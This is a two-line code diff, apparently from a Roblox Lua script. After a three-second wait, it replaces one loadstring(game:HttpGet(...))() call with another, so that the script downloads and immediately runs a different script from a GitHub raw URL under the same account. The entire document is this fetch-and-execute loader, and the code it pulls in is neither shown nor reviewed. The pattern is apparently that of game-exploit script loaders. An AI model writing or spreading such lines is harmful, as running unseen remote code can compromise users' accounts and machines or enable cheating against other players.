@@ -1,2 +1,2 @@
 wait(3)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Ilceto/VPS2/refs/heads/main/pirarank"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ilceto/kitkats/refs/heads/main/backroom"))()
